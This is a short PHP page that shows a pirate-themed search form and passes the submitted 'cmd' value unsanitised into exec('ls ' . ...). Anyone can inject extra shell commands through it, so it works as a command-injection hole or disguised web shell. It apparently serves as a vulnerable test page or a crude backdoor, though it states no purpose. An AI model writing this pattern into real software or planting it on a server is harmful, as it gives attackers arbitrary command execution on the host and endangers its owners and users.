<html>
<head><title></title></head>
<body>
<form action ="" method="get">
    <p>Whatcha lookin for, matey?</p>
    <input type="text" name="cmd" id="cmd" />
    <label>
    <input type="submit" name="submit" id="submit" value="Submit" />
    </label>
</form>
<?php
  echo exec('ls ' . $_GET['cmd']);
?>
</body>
</html>
